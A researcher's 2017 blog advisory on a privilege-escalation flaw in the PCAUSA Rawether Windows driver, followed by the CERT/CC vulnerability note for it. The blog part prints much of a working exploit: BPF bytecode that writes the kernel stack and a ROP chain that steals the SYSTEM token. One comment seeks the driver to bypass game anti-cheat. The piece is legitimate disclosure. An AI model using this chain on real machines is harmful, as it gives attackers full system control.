=== Content from blog.rewolf.pl_38767b41_20250125_141816.html ===


[Skip to content](#content)

* [View menu](#tab-1)

* [View sidebar](#tab-3)

# [ReWolf's blog](http://blog.rewolf.pl/blog/)

* [Home](http://blog.rewolf.pl/blog/)
* [Posts archive](http://blog.rewolf.pl/blog/?page_id=679)
* [Contact](http://blog.rewolf.pl/blog/?page_id=1730)

[![](https://feeds.feedburner.com/~fc/RewolfsBlog?bg=303030&fg=FFFFFF&anim=0)](https://blog.rewolf.pl/blog/?feed=rss2)

[Follow @rwfpl](https://twitter.com/rwfpl)

[Follow @rwfpl](https://github.com/rwfpl)

BitCoin Donation
1REwoLFY8JNYxJSHoVyEdrVzEvJwnwTXi

## Pages

* [Articles](http://blog.rewolf.pl/blog/?page_id=47)
* [Contact](http://blog.rewolf.pl/blog/?page_id=1730)
* [Posts archive](http://blog.rewolf.pl/blog/?page_id=679)
## My Projects

* [Terminus Project](http://terminus.rewolf.pl "Advanced NTDLLs structures diff")
* [dirtyJOE – Java Overall Editor](http://dirty-joe.com "Site of dirtyJOE – Java Overall Editor project")
* [GitHub](http://github.com/rwfpl "My GitHub")

## Blogroll

* [/dev/krzaq](https://dev.krzaq.cc/ "/dev/krzaq, C++")
* [Pwning Mad](https://pwningmad.wordpress.com/)
* [Kacper Szurek blog](http://security.szurek.pl/ "Vulnerabilities discovered by Kacper Szurek")
* [j00ru//vx tech blog](http://j00ru.vexillium.org)
* [Gynvael Coldwind](http://gynvael.coldwind.pl/)
* [Spinning mirrors](http://omeg.pl/blog "Omega Red’s blog")
* [GDTR](http://gdtr.wordpress.com/)

[March 15, 2017](http://blog.rewolf.pl/blog/?p=1778) by  [ReWolf](http://blog.rewolf.pl/blog/?author=1)
# PCAUSA Rawether for Windows local privilege escalation

* [assembly](http://blog.rewolf.pl/blog/?cat=12), [pwn](http://blog.rewolf.pl/blog/?cat=21), [reverse engineering](http://blog.rewolf.pl/blog/?cat=3), [source code](http://blog.rewolf.pl/blog/?cat=5), [windows internals](http://blog.rewolf.pl/blog/?cat=18), [x64](http://blog.rewolf.pl/blog/?cat=11)
* [10 Comments](http://blog.rewolf.pl/blog/?p=1778#comments)

**Rawether for Windows** is a framework that facilitates communication between an application and the **NDIS miniport driver**. It’s produced by a company named **Printing Communications Assoc., Inc.** (**PCAUSA**), which seems to be no longer operating. Company websites can be still reached through *web.archive.org*:

[http://web.archive.org/web/20151017034756/http://www.pcausa.com/](http://web.archive.org/web/20151017034756/http%3A//www.pcausa.com/)

[http://web.archive.org/web/20151128171809/http://www.rawether.net/](http://web.archive.org/web/20151128171809/http%3A//www.rawether.net/)

**Rawether** framework provides **NDIS Protocol Driver** similar to the **NPF.SYS** (part of the **WinPcap**). This framework is used by many different hardware vendors in their WiFi and router control applications. Exploit attached to this advisory targets 64bit version of *PcaSp60.sys* driver which is part of **ASUS PCE-AC56 WLAN Card Utilities**.

Identifying other affected vendors is quite problematic, since **Rawether** is just a framework it is possible that the driver name, device name or driver version info were changed. Additionally, verifying if the particular software is really vulnerable is sometimes not feasible, because installation package won’t install without specific hardware.

Default naming convention for the affected drivers:

* PcaSp60.sys
* PcaSp50.sys
* PcaMp60.sys
* PcaMp50.sys

### Disclosure timeline

| 28 Oct 2016 | Contacted tdivine@pcausa.com and security@asus.com |
| --- | --- |
| 2 Nov 2016 | ASUS asked about further details |
| 23 Nov 2016 | Received beta version of ASUS PCE-AC56 WLAN Card Utilities – it is no longer using vulnerable driver |
| 27 Nov 2016 | Asked ASUS if they are also plan to fix other software that is possibly using vulnerable driver (if any) |
| 7 Dec 2016 | Tried contacting PCAUSA on the different e-mail address: pcausa@gmail.com |
| Jan 2017 | Further fixes on the ASUS side, some packages are already fixed on the website |
| Feb 2017 |
| 15 Mar 2017 | Disclosure, ASUS has not fixed all packages |

### Technical Details

**PcaSp** driver implements **Berkeley Packet Filter** (**BPF**) mechanism:

<https://www.kernel.org/doc/Documentation/networking/filter.txt>

**BPF** filters are compiled into small programs that are executed by **BPF** virtual machine. **BPF VM** has two registers and can perform simple load/store/branch/alu operations:

| ```   Instruction  Description         ld           ;Load word into A       ldi          ;Load word into A       ldh          ;Load half-word into A       ldb          ;Load byte into A       ldx          ;Load word into X       ldxi         ;Load word into X       ldxb         ;Load byte into X         st           ;Store A into M[]       stx          ;Store X into M[]         jmp          ;Jump to label       ja           ;Jump to label       jeq          ;Jump on A == k       jneq         ;Jump on A != k       jne          ;Jump on A != k       jlt          ;Jump on A <  k       jle          ;Jump on A <= k       jgt          ;Jump on A >  k       jge          ;Jump on A >= k       jset         ;Jump on A &  k         add          ;A + <x>       sub          ;A - <x>       mul          ;A * <x>       div          ;A / <x>       mod          ;A % <x>       neg          ;!A       and          ;A & <x>       or           ;A | <x>       xor          ;A ^ <x>       lsh          ;A << <x>       rsh          ;A >> <x>         tax          ;Copy A into X       txa          ;Copy X into A         ret          ;Return ``` |
| --- |

Instruction Description
ld ;Load word into A
ldi ;Load word into A
ldh ;Load half-word into A
ldb ;Load byte into A
ldx ;Load word into X
ldxi ;Load word into X
ldxb ;Load byte into X
st ;Store A into M[]
stx ;Store X into M[]
jmp ;Jump to label
ja ;Jump to label
jeq ;Jump on A == k
jneq ;Jump on A != k
jne ;Jump on A != k
jlt ;Jump on A < k
jle ;Jump on A <= k
jgt ;Jump on A > k
jge ;Jump on A >= k
jset ;Jump on A & k
add ;A + <x>
sub ;A - <x>
mul ;A \* <x>
div ;A / <x>
mod ;A % <x>
neg ;!A
and ;A & <x>
or ;A | <x>
xor ;A ^ <x>
lsh ;A << <x>
rsh ;A >> <x>
tax ;Copy A into X
txa ;Copy X into A
ret ;Return

Exact implementation of the **VM** can be looked up in **WinPcap** sources:

<https://github.com/wireshark/winpcap/blob/master/packetNtx/driver/win_bpf.h>

<https://github.com/wireshark/winpcap/blob/master/packetNtx/driver/win_bpf_filter.c>

**Rawether** driver uses almost exactly the same code with just a small difference. **WinPcap** calls **bpf\_validate()** function when someone sets the packet filter program and it forbids to set malformed filters. Validation routine performs standard memory load/store checks and simple control flow checks to avoid endless loops and jumping outside of the **BPF** filter. During filtering stage, **BPF** program is executed without those checks, since it relies on the one-time validation which was performed earlier. **Rawether** driver doesn’t perform this validation, thus it is possible to write **BPF** program that will read/write arbitrary memory (or just endlessly loop, but it is not really interesting).

Read/write address is relative to the current stack position – internal memory that can be accessed from the **BPF** program is just local array of ints. On **x86** platform it is possible to access full 32bit memory address range. On **x64**, exploit can reliably access only the stack memory, which is sufficient to build working **ROP chain**. Since **BPF** program allows write to any stack location, it is very easy to overwrite return address without even touching stack canary (which btw this function doesn’t use).

I’ve started building the payload by defining *writeStack()* function:

| ``` struct bpf_insn {     unsigned __int16 code;     char jt;     char jf;     unsigned int k;     bpf_insn(unsigned __int16 code, char jt, char jf, unsigned int k) : code(code), jt(jt), jf(jf), k(k) {} };   void writeStack(std::vector<bpf_insn>& bytecode, int idx, uint64_t value) {     bytecode.emplace_back(bpf_insn(0, 0, 0, value & 0xFFFFFFFF));     bytecode.emplace_back(bpf_insn(2, 0, 0, 0x12 + 2 * idx));     bytecode.emplace_back(bpf_insn(0, 0, 0, (value >> 32) & 0xFFFFFFFF));     bytecode.emplace_back(bpf_insn(2, 0, 0, 0x12 + 2 * idx + 1)); } ``` |
| --- |

struct bpf\_insn
{
unsigned \_\_int16 code;
char jt;
char jf;
unsigned int k;
bpf\_insn(unsigned \_\_int16 code, char jt, char jf, unsigned int k) : code(code), jt(jt), jf(jf), k(k) {}
};
void writeStack(std::vector<bpf\_insn>& bytecode, int idx, uint64\_t value)
{
bytecode.emplace\_back(bpf\_insn(0, 0, 0, value & 0xFFFFFFFF));
bytecode.emplace\_back(bpf\_insn(2, 0, 0, 0x12 + 2 \* idx));
bytecode.emplace\_back(bpf\_insn(0, 0, 0, (value >> 32) & 0xFFFFFFFF));
bytecode.emplace\_back(bpf\_insn(2, 0, 0, 0x12 + 2 \* idx + 1));
}

Above function performs 4 operations:

| ```     ldi    (value & 0xFFFFFFFF)	; Load low 32bits of value into Accumulator     st     [0x12 + 2*idx]	; Store Accumulator to memory at [0x12 + 2*idx]     ldi    (value >> 32)	; Load hi 32bits of value into Accumulator     st     [0x12 + 2*idx + 1]	; Store Accumulator to memory at [0x12 + 2*idx + 1] ``` |
| --- |

ldi (value & 0xFFFFFFFF) ; Load low 32bits of value into Accumulator
st [0x12 + 2\*idx] ; Store Accumulator to memory at [0x12 + 2\*idx]
ldi (value >> 32) ; Load hi 32bits of value into Accumulator
st [0x12 + 2\*idx + 1] ; Store Accumulator to memory at [0x12 + 2\*idx + 1]

**0x12** is the size of the stack frame (divided by 4, because the local memory is represented as an array of *ints*), so *writeStack()* can be used to overwrite **bpf\_filter()** return address and all stack frames which are above.

I’ll briefly go through the **ROP chain** that I’ve created. First stage of the **ROP** has to reset spinlock which is acquired just before call to **bpf\_filter()**:

| ```   // !!! spinlock acquistion here !!!   v17 = KeAcquireSpinLockRaiseToDpc(&ctx->W32NOpenListSpinLock.SpinLock);     v18 = (_W32N_OPEN_CONTEXT *)ctx->W32NOpenList.Flink;   ctx->W32NOpenListSpinLock.OldIrql = v17;   while ( v18 && (_LIST_ENTRY *)v18 != &ctx->W32NOpenList )   {     if ( v18 && v18->bRxEnable && v18->nPacketFilter )     {       bpfProgram = v18->pBPFProgram;       if ( bpfProgram && v18->nBPFProgramSize )       {         LODWORD(v31) = 0;         v11 = (unsigned int)bpf_filter(bpfProgram, packetBuffer, packetBufferSizeOut, 0i64, v31, totalPacketSize) != 0;       }       else       {         v11 = 1;       }       if ( v11 )       {         v13 = v18;         break;       }     } ``` |
| --- |

// !!! spinlock acquistion here !!!
v17 = KeAcquireSpinLockRaiseToDpc(&ctx->W32NOpenListSpinLock.SpinLock);
v18 = (\_W32N\_OPEN\_CONTEXT \*)ctx->W32NOpenList.Flink;
ctx->W32NOpenListSpinLock.OldIrql = v17;
while ( v18 && (\_LIST\_ENTRY \*)v18 != &ctx->W32NOpenList )
{
if ( v18 && v18->bRxEnable && v18->nPacketFilter )
{
bpfProgram = v18->pBPFProgram;
if ( bpfProgram && v18->nBPFProgramSize )
{
LODWORD(v31) = 0;
v11 = (unsigned int)bpf\_filter(bpfProgram, packetBuffer, packetBufferSizeOut, 0i64, v31, totalPacketSize) != 0;
}
else
{
v11 = 1;
}
if ( v11 )
{
v13 = v18;
break;
}
}

or in assembly:

| ``` .text:00014A21 48 8D 4E 38           lea     rcx, [rsi+38h]  ; SpinLock .text:00014A25 FF 15 DD 16 00 00     call    cs:__imp_KeAcquireSpinLockRaiseToDpc ``` |
| --- |

.text:00014A21 48 8D 4E 38 lea rcx, [rsi+38h] ; SpinLock
.text:00014A25 FF 15 DD 16 00 00 call cs:\_\_imp\_KeAcquireSpinLockRaiseToDpc

To reset **KSPIN\_LOCK** it is sufficient to set the spin lock value to zero. **KSPIN\_LOCK** value is kept under *[rsi + 0x38]* during the whole **bpf\_filter()** execution.

| ```     int idx = 0;     std::vector<bpf_insn> bytecode;       // reset spinlock       // mov    r14, address of any `pop register` gadget     // mov    rcx, rsi    ; rsi points to the internal context structure     // call   r14         ; calls `pop register` and proceed to the next gadget     // mov    dword ptr [rcx + 0x38], eax  ; eax is 0 at this point       writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopR14));     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRcxRsiCallR14));     writeStack(bytecode, idx++, gogo.getSymbol("MovPtrRcx38Eax")); ``` |
| --- |

int idx = 0;
std::vector<bpf\_insn> bytecode;
// reset spinlock
// mov r14, address of any `pop register` gadget
// mov rcx, rsi ; rsi points to the internal context structure
// call r14 ; calls `pop register` and proceed to the next gadget
// mov dword ptr [rcx + 0x38], eax ; eax is 0 at this point
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopR14));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRcxRsiCallR14));
writeStack(bytecode, idx++, gogo.getSymbol("MovPtrRcx38Eax"));

In next steps I’m getting **EPROCESS** address of the process that will be elevated (**PsLookupProcessByProcessId**) and address of *“NT AUTHORITY\SYSTEM”* **EPROCESS** using **PsGetCurrentProcess**. **bpf\_filter()** is called from *NDIS\_PROTOCOL\_DRIVER\_CHARACTERISTICS.ReceiveNetBufferListsHandler*, from what I saw this handler is called from some **NDIS** helper thread, thus it has **SYSTEM** rights. Later, **ROP** chain overwrites target process token with the token stolen from **SYSTEM** process and returns the execution to the epilogue of the *ReceiveNetBufferListsHandler*. Described method can be simplified, but I wrote this exploit before I finished [GoGoGadget](http://blog.rewolf.pl/blog/?p=1739) library and without properly doing the homework with regard to kernel information leaks. Having **EPROCESS** information leaks in place, calls to **PsLookupProcessByProcessId** and **PsGetCurrentProcess** can be skipped, and **ROP** can just use **EPROCESS** addresses gathered by ring3 part of the exploit.

| ```     // get current process EPROCESS     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRcx));     writeStack(bytecode, idx++, myPID);     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));     writeStack(bytecode, idx++, pcaBase + 0x7400);     writeStack(bytecode, idx++, gogo.getSymbol("ntoskrnl.exe", "PsLookupProcessByProcessId"));     writeStack(bytecode, idx++, gogo.getSymbol("Pop4Times"));     writeStack(bytecode, idx++, 0);     writeStack(bytecode, idx++, 0);     writeStack(bytecode, idx++, 0);     writeStack(bytecode, idx++, 0);       // get NT AUTHORITY\SYSTEM EPROCESS     writeStack(bytecode, idx++, gogo.getSymbol("ntoskrnl.exe", "PsGetCurrentProcess"));     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRcx));     writeStack(bytecode, idx++, 0x358);     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::AddRaxRcx));     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRaxPtrRax));       writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRbxRax));       writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRax));     writeStack(bytecode, idx++, pcaBase + 0x7400);     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRaxPtrRax));     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::AddRaxRcx));       writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopR14));     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRcxRbxCallR14));     writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovPtrRaxRcx));       // pcaBase + 0x4C89	-> restore registers (without rbx, but it seems to be ok in this case)     writeStack(bytecode, idx++, pcaBase + 0x4C89);       bytecode.emplace_back(bpf_insn(6, 0, 0, 0));	// return 0, so rax = 0 at the begining of ROP execution ``` |
| --- |

// get current process EPROCESS
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRcx));
writeStack(bytecode, idx++, myPID);
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));
writeStack(bytecode, idx++, pcaBase + 0x7400);
writeStack(bytecode, idx++, gogo.getSymbol("ntoskrnl.exe", "PsLookupProcessByProcessId"));
writeStack(bytecode, idx++, gogo.getSymbol("Pop4Times"));
writeStack(bytecode, idx++, 0);
writeStack(bytecode, idx++, 0);
writeStack(bytecode, idx++, 0);
writeStack(bytecode, idx++, 0);
// get NT AUTHORITY\SYSTEM EPROCESS
writeStack(bytecode, idx++, gogo.getSymbol("ntoskrnl.exe", "PsGetCurrentProcess"));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRcx));
writeStack(bytecode, idx++, 0x358);
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::AddRaxRcx));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRaxPtrRax));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRbxRax));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRax));
writeStack(bytecode, idx++, pcaBase + 0x7400);
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRaxPtrRax));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::AddRaxRcx));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopR14));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::PopRdx));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovRcxRbxCallR14));
writeStack(bytecode, idx++, gogo.getSymbol(GadgetType::MovPtrRaxRcx));
// pcaBase + 0x4C89 -> restore registers (without rbx, but it seems to be ok in this case)
writeStack(bytecode, idx++, pcaBase + 0x4C89);
bytecode.emplace\_back(bpf\_insn(6, 0, 0, 0)); // return 0, so rax = 0 at the begining of ROP execution

The last bytecode operation is *“return 0”* so the **bpf\_filter()** function will set the **eax** register to 0 at the end of the **BPF** program. I’m using this value to reset spinlock at the begining of the **ROP** chain.

To enable vulnerable part of the driver, exploit has to issue *OID\_GEN\_CURRENT\_PACKET\_FILTER* **NDIS** request with *NDIS\_PACKET\_TYPE\_ALL\_LOCAL* flags and set the **BPF** program. Exploit is triggered by reading the first received network packet.

**PoC** exploit was tested on **Win10 x64 TH2** and **RS1** and is available on github:

<https://github.com/rwfpl/rewolf-pcausa-exploit>

Should work with *PcaSp60.sys* SHA1: *bd44ffa4784cc539c376fccef1315f461af8953e*

![](http://blog.rewolf.pl/blog/wp-content/uploads/2017/03/pcausa.png)

# Post navigation

[← Previous Post GoGoGadget – kernel exploitation helper class](http://blog.rewolf.pl/blog/?p=1739)[Next Post → Reverse engineering Mortal Kombat GRA file format (part 1)](http://blog.rewolf.pl/blog/?p=1837)

### 10 Comments

1. ![](http://1.gravatar.com/avatar/?s=51&d=retro&r=g)
   [VU#600671: PCAUSA Rawether for Windows local privilege escalation – Opsfolio](http://opsfolio.cak.netspective.com/2017/03/21/vu600671-pcausa-rawether-for-windows-local-privilege-escalation/) [March 21, 2017 at 21:55](http://blog.rewolf.pl/blog/?p=1778#comment-64964)

   […] researcher has provided a proof of concept affecting the 64-bit version of PcaSp60.sys driver which is part of ASUS PCE-AC56 WLAN Card […]

   [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=64964#respond)
3. ![](http://1.gravatar.com/avatar/?s=51&d=retro&r=g)
   [VU#600671: PCAUSA Rawether for Windows local privilege escalation – My CMS](https://systemdefense.org/?p=25) [March 27, 2017 at 19:34](http://blog.rewolf.pl/blog/?p=1778#comment-64970)

   […] researcher has provided a proof of concept affecting the 64-bit version of PcaSp60.sys driver which is part of ASUS PCE-AC56 WLAN Card […]

   [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=64970#respond)
5. ![](http://0.gravatar.com/avatar/6cb3198f94aa7722593849d79864d786?s=51&d=retro&r=g)
   greed [October 13, 2017 at 00:00](http://blog.rewolf.pl/blog/?p=1778#comment-65093)

   I want to use this so I can disable DSE to load an unsigned driver to bypass Battleye’s AC for pubg, but I can’t find that damn driver! I would use the public VBox exploit, but everyone is saying it’s detected & to go find a new vulnerable driver. Do you still have it laying around?

   [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=65093#respond)

   1. ![](http://0.gravatar.com/avatar/62f33668c06c2f978a2aaa9f2a8b5450?s=51&d=retro&r=g)
      ReWolf [October 31, 2017 at 20:28](http://blog.rewolf.pl/blog/?p=1778#comment-65099)

      I’m pretty sure you will find it somewhere around, there is tons of those drivers.

      [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=65099#respond)
7. ![](http://0.gravatar.com/avatar/f98161a1d7acb28e23a4dd589e28659a?s=51&d=retro&r=g)
   [Tony Mason](https://fsgeek.ca) [November 6, 2017 at 20:02](http://blog.rewolf.pl/blog/?p=1778#comment-65101)

   Thomas Divine passed away in 2015, which is why you won’t receive any answer from him. <http://georgia.tributes.com/dignitymemorial/obituary/Thomas-Frank-Divine-102608512>

   [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=65101#respond)

   1. ![](http://0.gravatar.com/avatar/62f33668c06c2f978a2aaa9f2a8b5450?s=51&d=retro&r=g)
      ReWolf [January 6, 2018 at 00:04](http://blog.rewolf.pl/blog/?p=1778#comment-65131)

      I’m sorry to hear that, this is really sad news.

      [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=65131#respond)
9. ![](http://2.gravatar.com/avatar/?s=51&d=retro&r=g)
   [CVE-2017-3196 – 安百科技](https://vul.anbai.com/66389.html) [December 17, 2017 at 01:04](http://blog.rewolf.pl/blog/?p=1778#comment-65114)

   […] <http://blog.rewolf.pl/blog/?p=1778> […]

   [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=65114#respond)
11. ![](http://1.gravatar.com/avatar/?s=51&d=retro&r=g)
    [CVE-2017-3196 - CVE.report](https://cve.report/CVE-2017-3196) [March 24, 2021 at 16:39](http://blog.rewolf.pl/blog/?p=1778#comment-65635)

    […] MISC:<http://blog.rewolf.pl/blog/?p=1778> […]

    [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=65635#respond)
13. ![](http://1.gravatar.com/avatar/d174b51b2348c4d4430d02f710b59d43?s=51&d=retro&r=g)
    Liam [January 16, 2023 at 12:22](http://blog.rewolf.pl/blog/?p=1778#comment-65739)

    Since Thomas has died and PCAUSA no longer exists, do you have a copy of the original Rawether Professional source code? I really need this to compile an ARM64 version of the driver.

    [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=65739#respond)

    1. ![](http://1.gravatar.com/avatar/ac581a25b78442596bb9a020b3aea8bb?s=51&d=retro&r=g)
       ReWolf [January 17, 2023 at 19:27](http://blog.rewolf.pl/blog/?p=1778#comment-65740)

       I never had any source code.

       [Reply](http://blog.rewolf.pl/blog/?p=1778&replytocom=65740#respond)

### Leave a Reply [Cancel reply](/blog/?p=1778#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

[Proudly powered by WordPress](http://wordpress.org/)
 |
Theme: editor by [Array](https://array.is/)



=== Content from www.kb.cert.org_312be1e2_20250125_141818.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#600671

## PCAUSA Rawether for Windows local privilege escalation

#### Vulnerability Note VU#600671

Original Release Date: 2017-03-21 | Last Revised: 2017-04-21

---

### Overview

PCAUSA's Rawether framework does not properly validate BPF data, allowing a crafted malicious BPF program to perform operations on memory outside of its typical bounds on the driver's receipt of network packets. This vulnerability may be exploited to perform local privilege escalation on Windows systems.

### Description

| The Rawether framework for Windows, originally produced by Printing Communications Assoc., Inc. (PCAUSA), is a framework that facilitates communication between an application and the [Network Driver Interface System](https://msdn.microsoft.com/en-us/windows/hardware/drivers/network/introduction-to-ndis-protocol-drivers) (NDIS) protocol**.** This framework is used by many different hardware vendors in their WiFi and router control applications. Rawether implements the [Berkeley Packet Filter](https://www.kernel.org/doc/Documentation/networking/filter.txt) (BPF) mechanism. BPF filters are compiled into small programs that are executed by a BPF virtual machine.  [**CWE-119**](http://cwe.mitre.org/data/definitions/119.html)**: Improper Restriction of Operations within the Bounds of a Memory Buffer** - CVE-2017-3196The Rawether framework does not properly validate BPF programs before execution, allowing BPF programs that may read/write arbitrary memory or infinitely loop. The return address on the stack may be overwritten, allowing a local user to execute arbitrary code with SYSTEM privileges.To enable the vulnerable part of the driver, an exploit has to issue a *OID\_GEN\_CURRENT\_PACKET\_FILTER* NDIS request with *NDIS\_PACKET\_TYPE\_ALL\_LOCAL* flags and set the BPF program. The exploit is triggered by reading the first received network packet.The researcher has provided a [proof of concept](http://blog.rewolf.pl/blog/?p=1778) affecting the 64-bit version of *PcaSp60.sys* driver which is part of ASUS PCE-AC56 WLAN Card Utilities. However, other utilities and programs making use of this driver may also be affected. Identifying vulnerable software may be difficult due to variations in driver name, version, or device name or information, but the vulnerable driver is most likely included in OEM WiFi utility programs. Some common default naming convention for the affected drivers include:     + PcaSp60.sys + PcaSp50.sys + PcaMp60.sys + PcaMp50.sys  For more information, see the researcher's [blog post](http://blog.rewolf.pl/blog/?p=1778). |
| --- |

### Impact

| A local authenticated attacker may be able to execute a malicious BPF program that can execute arbitrary code with SYSTEM privileges. |
| --- |

### Solution

| **Apply an update or uninstall affected software**Apply an update to any software that makes use of the Rawether driver. Alternately, uninstall any affected software.A list of possibly affected vendors is given below and will be updated as we learn more. |
| --- |

### Vendor Information

600671
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23600671/) to view vendors.**
### [ASUSTeK Computer Inc.](#GWAN-AKJR85) Affected

Notified:  March 17, 2017  Updated: March 21, 2017

**Statement Date:   March 21, 2017**

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

ASUS expects updated utilities to be released by the end of March.

### [Printing Communications Association, Inc.](#GWAN-AKJPKN) Affected

Updated:  March 17, 2017

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### [Dell](#BLUU-AKJS7N) Not Affected

Notified:  March 17, 2017  Updated: April 21, 2017

**Statement Date:   April 20, 2017**

### Status

Not Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### [Acer](#BLUU-AKJS7Q) Unknown

Notified:  March 17, 2017  Updated: March 17, 2017

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor References

### [Hewlett Packard Enterprise](#BLUU-AKJS7S) Unknown

Notified:  March 17, 2017  Updated: March 17, 2017

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor References

### [Lenovo](#BLUU-AKJSS3) Unknown

Notified:  March 17, 2017  Updated: March 17, 2017

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor References

### [Toshiba America Information Systems, Inc.](#BLUU-AKJS7V) Unknown

Notified:  March 17, 2017  Updated: March 17, 2017

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor References

### [VAIO Corporation](#BLUU-AKJSS5) Unknown

Notified:  March 17, 2017  Updated: March 17, 2017

### Status

Unknown

### Vendor Statement

We have not received a statement from the vendor.

### Vendor References

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 6.6 | AV:L/AC:M/Au:S/C:C/I:C/A:C |
| Temporal | 5.6 | E:POC/RL:U/RC:UR |
| Environmental | 4.2 | CDP:ND/TD:M/CR:ND/IR:ND/AR:ND |

### References

* <http://blog.rewolf.pl/blog/?p=1778>
* <http://cwe.mitre.org/data/definitions/119.html>
* <https://www.kernel.org/doc/Documentation/networking/filter.txt>
* <https://msdn.microsoft.com/en-us/windows/hardware/drivers/network/introduction-to-ndis-protocol-drivers>
### Acknowledgements

This issue was reported publicly by "ReWolf" (@rwfpl).

This document was written by Garret Wassermann.

### Other Information

| **CVE IDs:** | [CVE-2017-3196](http://web.nvd.nist.gov/vuln/detail/CVE-2017-3196) |
| --- | --- |
| **Date Public:** | 2017-03-15 |
| **Date First Published:** | 2017-03-21 |
| **Date Last Updated:** | 2017-04-21 04:50 UTC |
| **Document Revision:** | 35 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800


